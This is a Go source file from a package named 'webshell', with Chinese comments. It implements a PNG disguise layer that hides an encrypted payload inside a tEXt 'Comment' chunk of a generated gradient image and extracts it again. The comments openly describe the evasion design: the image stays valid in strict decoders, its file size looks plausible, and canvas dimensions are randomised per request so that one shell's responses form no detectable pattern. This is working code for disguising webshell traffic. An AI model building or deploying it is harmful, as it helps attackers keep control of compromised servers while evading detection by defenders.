package webshell

// disguise_png.go — PNG tEXt 容器链。
//
// 最初把密文追加在 IDAT 解压流的像素之后，被 image/png 直接拒绝
// （"too much pixel data"）——libpng 宽松，Go 与多数严格实现不放行，这条路不通。
// 现在改为塞进 tEXt 文本块：tEXt 是 PNG 标准里的公共元数据块（软件名、注释、
// 拍摄参数都放这里），解码器读到就跳过，不解压、不参与渲染，因此图片在任何
// 解码器里都是完全合法的。
//
// 像素用平滑渐变，IDAT 压缩后只有几 KB，整张图的体积基本等于密文本身，
// 不会出现「一张小图却有几百 KB」这种一眼假的体积特征。

import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"hash/crc32"
)

// pngSignature PNG 文件头。
var pngSignature = []byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'}

// maxDisguiseRaw 解压后上限，防止恶意容器把服务端内存打爆（zlib 炸弹）。
const maxDisguiseRaw = 64 << 20

// pngTextKeyword tEXt 的关键字，用 Comment 是为了和常见图片元数据混在一起。
const pngTextKeyword = "Comment"

type pngDisguise struct{}

func (pngDisguise) Name() string        { return "png" }
func (pngDisguise) ContentType() string { return "image/png" }

// pngCanvas 随机画布，比例固定 4:3。每次请求尺寸不同，避免同一 shell 的
// 响应体积/尺寸完全一致而形成可聚类特征。
func pngCanvas() (w, h int) {
	var b [2]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 320, 240
	}
	w = 180 + int(binary.BigEndian.Uint16(b[:]))%300 // 180..479
	h = w * 3 / 4
	return w, h
}

func (pngDisguise) Wrap(secret []byte) ([]byte, error) {
	if len(secret) == 0 {
		return nil, errors.New("png: 载荷为空")
	}
	w, h := pngCanvas()

	// 扫描行：每行以 filter byte 0 开头，像素为对角渐变
	raw := make([]byte, 0, h*(w+1))
	for y := 0; y < h; y++ {
		raw = append(raw, 0)
		for x := 0; x < w; x++ {
			raw = append(raw, byte((x*255/w+y*255/h)/2))
		}
	}

	var comp bytes.Buffer
	zw, err := zlib.NewWriterLevel(&comp, zlib.BestSpeed)
	if err != nil {
		return nil, err
	}
	if _, err := zw.Write(raw); err != nil {
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}

	text := make([]byte, 0, len(pngTextKeyword)+1+4+len(secret))
	text = append(text, pngTextKeyword...)
	text = append(text, 0)
	text = append(text, packSecret(secret)...)

	out := make([]byte, 0, 128+comp.Len()+len(text))
	out = append(out, pngSignature...)
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:], uint32(w))
	binary.BigEndian.PutUint32(ihdr[4:], uint32(h))
	ihdr[8] = 8 // bit depth
	ihdr[9] = 0 // color type: grayscale
	out = append(out, pngChunk("IHDR", ihdr)...)
	out = append(out, pngChunk("IDAT", comp.Bytes())...)
	out = append(out, pngChunk("tEXt", text)...)
	out = append(out, pngChunk("IEND", nil)...)
	return out, nil
}

func (pngDisguise) Unwrap(container []byte) ([]byte, error) {
	if len(container) < 8 || !bytes.Equal(container[:8], pngSignature) {
		return nil, errors.New("png: 不是 PNG 容器")
	}
	for p := 8; p+8 <= len(container); {
		length := int(binary.BigEndian.Uint32(container[p:]))
		if length < 0 || p+12+length > len(container) {
			return nil, errors.New("png: chunk 长度越界")
		}
		typ := string(container[p+4 : p+8])
		data := container[p+8 : p+8+length]
		if typ == "tEXt" {
			i := bytes.IndexByte(data, 0)
			if i < 0 || i+1 > len(data) {
				return nil, errors.New("png: tEXt 缺关键字分隔符")
			}
			if string(data[:i]) != pngTextKeyword {
				p += 12 + length
				continue
			}
			return unpackSecret(data[i+1:])
		}
		if typ == "IEND" {
			break
		}
		p += 12 + length
	}
	return nil, errors.New("png: 未找到载荷块")
}

// pngChunk 组装一个带 CRC 的 chunk（长度 + 类型 + 数据 + CRC32）。
func pngChunk(typ string, data []byte) []byte {
	out := make([]byte, 0, 12+len(data))
	var n [4]byte
	binary.BigEndian.PutUint32(n[:], uint32(len(data)))
	out = append(out, n[:]...)
	out = append(out, typ...)
	out = append(out, data...)
	crc := crc32.NewIEEE()
	crc.Write([]byte(typ))
	crc.Write(data)
	var c [4]byte
	binary.BigEndian.PutUint32(c[:], crc.Sum32())
	out = append(out, c[:]...)
	return out
}
